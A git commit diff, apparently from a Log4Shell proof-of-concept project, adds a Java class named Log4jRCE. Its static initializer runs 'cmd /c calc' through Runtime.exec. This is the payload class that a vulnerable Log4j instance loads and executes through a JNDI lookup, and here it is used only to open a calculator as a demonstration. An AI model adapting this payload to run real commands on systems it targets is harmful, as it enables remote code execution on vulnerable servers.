0cf38860e504e09e59a862f9bacd4a91480678c2
kkw <wangkailong525@163.com>
2021-12-10 09:56:12 +0800

    Update Log4jRCE.java

--- src/main/java/Log4jRCE.java
+++ src/main/java/Log4jRCE.java
@@ -1,4 +1,13 @@
+import java.io.IOException;
 public class Log4jRCE {
-
-
+	static{
+		try {
+			java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+	public static void main(String[] args) {
+		
+	}
 }
